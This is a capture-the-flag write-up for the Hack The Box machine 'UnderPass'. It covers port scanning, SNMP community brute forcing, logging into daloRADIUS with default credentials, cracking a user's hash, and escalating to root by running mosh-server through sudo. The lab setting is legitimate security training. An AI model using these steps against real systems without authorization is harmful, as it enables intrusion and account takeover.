---
date: 2025-05-10
categories: [Linux, Easy]
---

![UnderPass](https://labs.hackthebox.com/storage/avatars/456a4d2e52f182847fb0a2dba0420a44.png)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [dakkmaddy](https://app.hackthebox.com/users/17571)        | [Hack The Box](https://www.hackthebox.com/)     | Easy           | Linux   |

---








- I start with a scan of the open ports and I continue with a scan of the versions and technologies that are running on the open ports that we have found

	```python
	nmap -p- --open --min-rate 5000 -Pn -sS 10.10.11.48 -oG scan
	nmap -p22,80 -sCV -Pn 10.10.11.48 -oN ports
	```
	
	![image](https://github.com/user-attachments/assets/3b0a6b8e-e445-48b9-845d-8e79539c882a)

- After searching files and directories of the web service I can't find anything. I decide to search for open UDP ports

	```python
	nmap -p- --open --min-rate 5000 -Pn -sU 10.10.11.48 -oG scan
	nmap -p161 -sUCV -Pn 10.10.11.48
	```
	
	![image](https://github.com/user-attachments/assets/ea95d80f-3235-42ee-88e1-0bd2844775b6)

	![image](https://github.com/user-attachments/assets/d03997fb-f785-4aa6-bf95-d1a2c95c6c07)

- When I find port 161 running a snmp service, I brute force to find out the commmunities and use them to run through the oids.

	```python
	onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt 10.10.11.48
	snmpwalk -v2c -c public 10.10.11.48
	```

	![image](https://github.com/user-attachments/assets/5bcea231-366d-4015-8c56-e945032dc6b7)

	![image](https://github.com/user-attachments/assets/b9f38add-0e2f-4af1-a919-a9c83cdbe581)

- Within the oids I find a possible hosts and add it to /etc/hosts. Then I look for information about daloradius and I find both the path to log in and the [default credentials](https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS).

	![image](https://github.com/user-attachments/assets/8f3511b3-48cf-49b5-adfe-f341499310d4)

- With these credentials I am able to log in and list the users. I try to crack the password hash with [crackstation](https://crackstation.net/) and get the password of the user svcMosh, underwaterfriends.

  ![image](https://github.com/user-attachments/assets/e07bb8b6-460f-4540-8e3e-279aa7eb73aa)

- Thanks to these credentials I am able to log in via ssh and read the first flag
	
	![image](https://github.com/user-attachments/assets/defb9b97-ea15-4cfe-af85-f2ba857b91aa)

- I list the commands that I can run as another user or with elevated permissions and I find a binary

	![image](https://github.com/user-attachments/assets/c4abfbce-348f-44c5-a9fc-83cca42a240e)

- After searching for information I see that I can set up a server as root and then connect to it. 

	```python
	sudo /usr/bin/mosh-server new -i 127.0.0.1 -p 60003
	
	MOSH_KEY=Diw7S+M9SdRft2HnB2OGIg  mosh-client 127.0.0.1 60003
	```

- Thanks to this, I am root and I can read the second flag.

  ![image](https://github.com/user-attachments/assets/2cff9301-164b-4934-a0ce-232f1d35880e)
